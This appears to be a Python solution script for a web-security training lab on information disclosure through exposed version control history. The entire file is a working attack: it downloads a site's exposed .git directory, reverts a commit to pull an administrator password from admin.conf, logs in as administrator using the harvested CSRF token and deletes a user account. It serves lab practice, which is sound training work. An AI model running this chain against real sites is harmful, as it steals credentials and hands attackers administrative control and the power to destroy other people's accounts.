###############################################################################
#
# Author: Ahmed Elqalawy (@elqal3awii)
#
# Date: 4/9/2023
#
# Lab: Information disclosure in version control history
#
# Steps: 1. Fetch the .git directory
#        2. Reset to the previous commit
#        3. Get the administrator password from the admin.conf file
#        4. Login as administrator
#        5. Delete carlos
#
###############################################################################


###########
# imports
###########
import requests
import re
from colorama import Fore
import os


#########
# Main
#########

# change this to your lab URL
domain = "0a6b008f0363b89182520be8002b00bf.web-security-academy.net"

try:
    # fetch the .git directory
    fetch_git_dir = os.system(f"wget -r https://{domain}/.git")

except:
    print(Fore.RED + "[!] Failed to fetch .git directory")
    exit(1)

print(Fore.WHITE + "1. Fetching .git directory.. " + Fore.GREEN + "OK")

# change current wroking directory
os.chdir(domain)

print(Fore.WHITE + "2. Changing current working directory.. " + Fore.GREEN + "OK")

# reset to the previous commit
os.system("git reset --hard HEAD~1")

print(Fore.WHITE + "3. Resetting to the previous commit.. " + Fore.GREEN + "OK")

# open the admin.conf file
admin_conf = open("admin.conf").readline()

print(Fore.WHITE + "4. Reading admin.conf file.. " + Fore.GREEN + "OK")

# extract the administrator pass
admin_pass = admin_conf.split("=")[1].split("\n")[0]

print(Fore.WHITE + "5. Extracting the administrator password.. " + Fore.GREEN + "OK" + Fore.WHITE + " => " + Fore.YELLOW + admin_pass)

try:
    # fetch the login page
    login_page = requests.get(f"https://{domain}/login")

except:
    print(Fore.RED + "[!] Failed to GET /login page")
    exit(1)


print(Fore.WHITE + "6. Fetching login page to get a valid session and csrf token.. " + Fore.GREEN + "OK")

# get session cookie
session = login_page.cookies.get("session")

# Extract the csrf token
csrf = re.findall("csrf.+value=\"(.+)\"", login_page.text)[0]

# data to send via POST
data = {
    "username": "administrator",
    "password": admin_pass,
    "csrf": csrf
}

# set session cookie
cookies = {
    "session": session
}

try: 
    # login as administrator
    login = requests.post(f"https://{domain}/login", data, cookies=cookies, allow_redirects=False)

except:
    print(Fore.RED + "[!] Failed to login")
    exit(1)

# if login is successful
if login.status_code == 302:
    print(Fore.WHITE + "7. Logging in as administrator.. " + Fore.GREEN + "OK")
    
    # get the new session after logging in
    new_session = login.cookies.get("session") 
    
    # set session cookie
    cookies = {
        "session": new_session
    }
 
    try: 
        # delete carlos
        delete_carlos = requests.get(f"https://{domain}/admin/delete?username=carlos", cookies=cookies)
        
    except:
        print(Fore.RED + "[!] Failed to delet carlos")
        exit(1)

    print(Fore.WHITE + "8. Deleting carlos.. " + Fore.GREEN + "OK")
    print(Fore.WHITE + "🗹 Check your browser, it should be marked now as " + Fore.GREEN + "solved")
    
else:
    print(Fore.RED + "[!] Failed to login as administrator")
